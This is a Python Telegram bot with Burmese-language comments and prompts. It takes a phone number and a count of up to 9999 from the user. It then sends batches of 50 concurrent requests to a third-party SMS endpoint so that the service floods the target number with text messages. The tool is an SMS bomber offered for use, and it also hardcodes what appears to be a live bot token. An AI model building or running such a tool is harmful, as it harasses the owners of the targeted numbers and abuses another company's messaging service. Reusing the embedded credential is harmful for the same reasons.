import asyncio
import aiohttp
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.error import RetryAfter

# Telegram Bot Token
TOKEN = "8702294693:AAGF_mmGKAg7-mWBuAl34jevVtDJ0mZE8HU"

# Conversation States
AGE_CHECK, PHONE_INPUT, AMOUNT_INPUT = range(3)

# Single Request Function
async def send_single_sms(session, normalized_phone):
    url = "https://api.maharprod.com/sms/v1/movie/telenor/atom_sms"
    try:
        async with session.post(url, json={"phoneNumber": normalized_phone}, timeout=5) as r:
            return r.status == 200
    except Exception:
        return False

# Live Update ပြသပေးမည့် SMS ပို့ခြင်းလုပ်ငန်းစဉ်
async def send_bulk_sms_with_live_status(normalized_phone, total_amount, status_message):
    success_count = 0
    fail_count = 0
    
    # Connection Pool Limit ကို ထိန်းချုပ်ခြင်း (အမြန်နှုန်းအတွက်)
    conn = aiohttp.TCPConnector(limit=50) 
    async with aiohttp.ClientSession(connector=conn) as session:
        
        # သတ်မှတ်ထားတဲ့ အကြိမ်ရေအထိ Chunk (အစုအဖွဲ့) လိုက် ခွဲပို့ပါမယ်
        chunk_size = 50  # တစ်ကြိမ်လျှင် အခု ၅၀ စီ ပြိုင်တူလွှတ်မည်
        
        for i in range(0, total_amount, chunk_size):
            current_chunk = min(chunk_size, total_amount - i)
            
            # ပြိုင်တူ ပို့ရန် Tasks များတည်ဆောက်ခြင်း
            tasks = [send_single_sms(session, normalized_phone) for _ in range(current_chunk)]
            results = await asyncio.gather(*tasks)
            
            # ရလဒ် ရေတွက်ခြင်း
            for r in results:
                if r:
                    success_count += 1
                else:
                    fail_count += 1
            
            # Telegram Bot Message ကို Live Update လုပ်ပေးခြင်း
            # Telegram Flood Control မမိစေရန်နှင့် စာသားတရိပ်ရိပ်တက်လာစေရန် ပြုလုပ်ခြင်း
            progress_percent = int(((success_count + fail_count) / total_amount) * 100)
            status_text = (
                f"🚀 SMS များ ပို့ဆောင်နေပါသည်...\n\n"
                f"📈 ပို့ပြီးသမျှစုစုပေါင်း: {success_count + fail_count} / {total_amount} ({progress_percent}%)\n"
                f"✅ အောင်မြင် (ရောက်ရှိ): {success_count} ကြိမ်\n"
                f"❌ ကျရှုံး (မရောက်ဘူး): {fail_count} ကြိမ်\n\n"
                f"⚡ အမြန်နှုန်း - {success_count + fail_count}..."
            )
            
            try:
                await status_message.edit_text(status_text)
            except RetryAfter as e:
                # Telegram က ခေတ္တ ငြင်းပယ်လျှင် စက္ကန့်အနည်းငယ် စောင့်ပါမည်
                await asyncio.sleep(e.retry_after)
            except Exception:
                pass
                
            # Request များအကြား အနည်းငယ် စောင့်ပေးခြင်း (API Server ဒေါင်းမသွားစေရန်)
            await asyncio.sleep(0.3) 

    return success_count, fail_count

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reply_keyboard = [['ဟုတ်ကဲ့၊ ၁၈ နှစ် ပြည့်ပါပြီ', 'မပြည့်သေးပါ']]
    await update.message.reply_text(
        "⚠️ သတိပေးချက်- ဤ Bot ကို အသုံးပြုရန် အသက် ၁၈ နှစ် ပြည့်ပြီးသူ ဖြစ်ရပါမည်။\n"
        "သင်သည် အသက် ၁၈ နှစ် ပြည့်ပြီးပြီလားခင်ဗျာ။",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True, resize_keyboard=True)
    )
    return AGE_CHECK

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == 'ဟုတ်ကဲ့၊ ၁၈ နှစ် ပြည့်ပါပြီ':
        await update.message.reply_text("📱 SMS ပို့မည့် ဖုန်းနံပါတ်ကို ရိုက်ထည့်ပေးပါ-", reply_markup=ReplyKeyboardRemove())
        return PHONE_INPUT
    else:
        await update.message.reply_text("❌ ဤ Bot သည် အသက် ၁၈ နှစ်မပြည့်သေးသူများ အသုံးပြုရန် မသင့်တော်ပါ။", reply_markup=ReplyKeyboardRemove())
        return ConversationHandler.END

async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['phone'] = update.message.text
    await update.message.reply_text("🔢 ဘယ်နှစ်ကြိမ် (ဘယ်လောက်အကြိမ်ရေ) ပို့မှာလဲခင်ဗျာ?\n(ဥပမာ- 100 သို့မဟုတ် 5000)")
    return AMOUNT_INPUT

async def process_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    amount_text = update.message.text
    if not amount_text.isdigit():
        await update.message.reply_text("❌ ကျေးဇူးပြု၍ ဂဏန်းစစ်စစ်သာ ရိုက်ထည့်ပေးပါရန်။")
        return AMOUNT_INPUT
        
    amount = int(amount_text)
    if amount <= 0 or amount > 9999:
        await update.message.reply_text("⚠️ အကြိမ်ရေသည် ၁ ကြိမ် မှ ၉၉၉၉ ကြိမ် အတွင်းသာ ဖြစ်ရပါမည်။")
        return AMOUNT_INPUT

    normalized_phone = context.user_data['phone']
    
    # ပထမဦးဆုံး အခြေအနေပြ စာသားကို ပို့လိုက်ပါတယ်
    status_message = await update.message.reply_text("⏳ လုပ်ငန်းစဉ်ကို စတင်ရန် ပြင်ဆင်နေပါပြီ...")
    
    # Live ပို့မည့် function ကို လှမ်းခေါ်ပြီး မက်ဆေ့ကိုပါ Parameter အဖြစ် ထည့်ပေးလိုက်ပါတယ်
    success, fail = await send_bulk_sms_with_live_status(normalized_phone, amount, status_message)
    
    # ပြီးဆုံးသွားချိန်တွင် နောက်ဆုံးရလဒ်ကို ပြခြင်း
    await status_message.edit_text(
        f"✅ **လုပ်ငန်းစဉ် ပြီးဆုံးပါပြီ။**\n\n"
        f"📊 တောင်းဆိုခဲ့သည့် အကြိမ်ရေ: {amount} ကြိမ်\n"
        f"🎉 အောင်မြင်စွာ ရောက်ရှိသွားခြင်း: {success} ကြိမ်\n"
        f"❌ မရောက်ရှိဘဲ ကျရှုံးသွားခြင်း: {fail} ကြိမ်"
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("လုပ်ငန်းစဉ်ကို ဖျက်သိမ်းလိုက်ပါပြီ။", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

def main():
    application = Application.builder().token(TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            AGE_CHECK: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_age)],
            PHONE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_phone)],
            AMOUNT_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_amount)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    application.add_handler(conv_handler)
    print("Live Status ပြသပေးမည့် Bot စတင်နေပါပြီ...")
    application.run_polling()

if __name__ == '__main__':
    main()
